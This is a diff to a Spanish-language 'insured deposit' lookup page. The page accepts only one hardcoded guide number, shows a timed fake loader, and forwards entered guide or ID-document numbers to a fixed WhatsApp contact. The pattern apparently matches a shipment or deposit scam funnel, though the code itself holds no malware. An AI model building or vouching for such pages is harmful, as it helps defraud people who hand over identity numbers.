@@ -136,9 +136,7 @@ button:disabled{
     <input type="text" id="guia" placeholder="Ingresa número de guía" oninput="soloNumeros(this)">
     <input type="text" id="documento" placeholder="Ingresa número de documento" oninput="soloNumeros(this)">
 
-    <div class="error" id="error">
-        Debe ingresar solo números válidos
-    </div>
+    <div class="error" id="error"></div>
 
     <button class="btn-primary" id="btnGuia" onclick="consultarGuia()">
         Consultar Guía
@@ -160,7 +158,8 @@ button:disabled{
 
 <script>
 
-const numeroWhatsApp = "573026219839"; // MISMO NÚMERO PARA AMBAS OPCIONES
+const numeroWhatsApp = "573026219839";
+const guiaValida = "0750925931"; // ÚNICA GUÍA PERMITIDA
 
 function soloNumeros(input){
     input.value = input.value.replace(/[^0-9]/g,'');
@@ -182,7 +181,8 @@ function consultarGuia(){
     var guia = document.getElementById("guia").value.trim();
     var error = document.getElementById("error");
 
-    if(guia === ""){
+    if(guia !== guiaValida){
+        error.innerText = "Número de guía inválido";
         error.style.display="block";
         return;
     }
@@ -194,7 +194,7 @@ function consultarGuia(){
         var mensaje = "Hola, realizo consulta de DEPÓSITO ASEGURADO.%0AGuía: " + guia;
         window.open("https://wa.me/" + numeroWhatsApp + "?text=" + mensaje, "_blank");
         ocultarLoader();
-    },2000);
+    },1500);
 }
 
 function consultarDocumento(){
@@ -202,6 +202,7 @@ function consultarDocumento(){
     var error = document.getElementById("error");
 
     if(doc === ""){
+        error.innerText = "Debe ingresar un número de documento válido";
         error.style.display="block";
         return;
     }
@@ -213,7 +214,7 @@ function consultarDocumento(){
         var mensaje = "Hola, realizo consulta de DEPÓSITO ASEGURADO.%0ADocumento: " + doc;
         window.open("https://wa.me/" + numeroWhatsApp + "?text=" + mensaje, "_blank");
         ocultarLoader();
-    },2000);
+    },1500);
 }
 
 </script>
